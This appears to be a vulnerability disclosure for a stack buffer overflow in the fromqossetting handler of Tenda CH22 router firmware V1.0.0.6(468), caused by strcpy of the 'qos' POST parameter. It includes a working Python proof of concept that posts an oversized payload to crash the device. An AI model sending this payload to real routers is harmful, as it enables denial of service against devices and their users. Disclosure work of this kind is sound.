## Overview
Firmware download website: https://www.tenda.com.cn/download/detail-2230.html
## Affected version

CH22 V1.0.0.6(468)
## Vulnerability details

CH22 V1.0.0.6(468) firmwarehas a stack overflow vulnerability located in the `fromqossetting` function. This function accepts the `qos` parameter from a POST request. The statement `v1 = strcpy(dest, src);` leads to a buffer overflow. The user-supplied `qos` can exceed the capacity of the `dest` array, thus triggering this security vulnerability.
![[2024-08-30 171456.png]]
## POC

```python
import requests
from pwn import*

ip = "192.168.109.145"
url = "http://" + ip + "/goform/fromqossetting"
payload = b"a"*1000

data = {"op":"aaa","qos": payload}
response = requests.post(url, data=data)
print(response.text)
```
![[2024-08-30 171541.png]]